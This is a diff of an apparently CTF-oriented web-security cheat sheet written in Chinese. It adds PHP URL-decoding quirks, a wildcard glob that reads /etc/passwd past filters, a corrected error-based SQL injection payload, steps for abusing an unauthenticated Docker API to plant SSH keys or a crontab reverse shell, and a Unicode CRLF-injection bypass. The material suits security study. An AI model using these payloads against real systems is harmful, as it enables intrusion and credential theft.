@@ -378,6 +378,16 @@ echo preg_replace('/(.*)kaibro/e','\\1info()',$a);
 - `<` => `*`
     - `a.<`
 
+## URL query decode
+- `$_GET`會對傳入的參數做URLdecode再返回
+- `$_SERVER['REQUEST_URI']`和`$_SERVER['QUERY_STRING']`則是直接返回
+Example:
+Request: `http://kaibro.tw/test.php?url=%67%67`
+    * $_GET: `[url] => gg`
+    * $_SERVER['REQUEST_URI']: `/test.php?url=%67%67`
+    * $_SERVER['QUERY_STRING']: `url=%67%67`
+
+
 
 ## 其他
 
@@ -410,6 +420,7 @@ cat $(ls)
 ## ? and *
 - `?` match one character
     - `cat fl?g`
+    - `/???/??t /???/p??s??`
 - `*` match 多個
     - `cat f*`
     - `cat f?a*`
@@ -634,7 +645,7 @@ pop graphic-context
         - `?order=IF(1=1, username, password)`
     - 利用報錯
         - `?order=IF(1=1,1,(select 1 union select 2))` 正確
-        - `?order=IF(1=1,1,(select 1 union select 2))` 錯誤
+        - `?order=IF(1=2,1,(select 1 union select 2))` 錯誤
         - `?order=IF(1=1,1,(select 1 from information_schema.tables))` 正常
         - `?order=IF(1=2,1,(select 1 from information_schema.tables))` 錯誤
     - Time Based
@@ -1453,6 +1464,11 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
             - Command Phase
         - `gopher://127.0.0.1:3306/_<PAYLOAD>`
 
+    - Docker 
+        - Remote api未授權訪問
+            - 開一個container，掛載/root/，寫ssh key
+            - 寫crontab彈shell
+
     - ImageMagick - CVE-2016-3718
         - 可以發送HTTP或FTP request
         - payload: ssrf.mvg
@@ -1671,6 +1687,11 @@ xxe.dtd:
     - `ＮＮ` => `..`
         - `Ｎ` 即 `\xff\x2e`
         - 轉型時捨棄第一個Byte
+
+- 特殊的CRLF Injection繞過
+    - `%E5%98%8A`
+    - 原始的Unicode碼為`U+560A`
+    - raw bytes: `0x56`, `0x0A`
 
 - MySQL utf8 v.s. utf8mb4
     - MySQL utf8編碼只支援3 bytes
